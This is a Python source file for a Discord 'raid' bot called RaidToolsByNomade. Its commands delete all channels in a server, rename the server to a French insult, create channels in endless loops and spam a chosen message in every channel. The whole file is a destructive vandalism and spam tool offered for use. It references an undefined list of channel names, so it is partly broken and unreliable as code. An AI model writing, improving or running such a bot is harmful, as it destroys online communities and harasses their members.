from discord.ext import commands
import time
import random
import os

# title code app
os.system("title RaidToolsByNomade")
os.system("color 2")
print("""
██████╗  █████╗ ██╗██████╗ ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
██████╔╝███████║██║██║  ██║   ██║   ██║   ██║██║   ██║██║     ███████╗
██╔══██╗██╔══██║██║██║  ██║   ██║   ██║   ██║██║   ██║██║     ╚════██║
██║  ██║██║  ██║██║██████╔╝   ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                                                      
""")

TOKEN = input("Enter Token of bot: ")
command_prefix = input("Enter Prefix: ")
msg = input("Enter the message: ")
client = commands.Bot(command_prefix)
client.remove_command('help')


@client.event
async def on_connect():
    print(f"{client.user} is online and ready")

@client.command(pass_context=True)
async def nuke(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
       try:
           await channel.delete()
           print(f"{channel.name} Has been deleted.")
       except:
            pass
    
    
    for i in range(1):
        try:
            await ctx.guild.edit(name="jte nique fdp")
            print("Name Changed!")
        except:
            print("name wasnt changed")

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(200):
                await guild.create_text_channel(random.choice(channel_names))

@client.command(pass_context=True)
async def d(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
           await channel.delete()
           print(f"{channel.name} Has been deleted.")
        except:
            pass

@client.command(pass_context=True)
async def r(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel(random.choice(channel_names))


@client.command(pass_context=True)
async def s(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(2):
        print("Spammed Channels!")
        while True:
            for channel in guild.text_channels:
                await channel.send(msg)
        
client.run(TOKEN)